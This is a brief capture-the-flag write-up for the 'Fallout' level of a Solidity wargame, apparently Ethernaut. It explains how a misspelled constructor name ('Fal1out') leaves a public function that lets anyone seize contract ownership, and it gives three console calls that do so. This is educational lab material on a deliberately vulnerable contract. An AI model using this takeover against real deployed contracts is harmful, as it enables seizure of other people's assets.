# Fallout

Claim ownership to complete level

Notice that contract use solidity version ^0.6.0 which still not control to use keyword `constructor` 
and developer make mistake on the constructor name from `fallout` to be `Fal1out`.So, it works like normal function.Not constructor on this contract.

```javascript
contract.owner() // check the owner
contract.Fal1out() //call the fatal construct
contract.owner() // check the owner change or not
```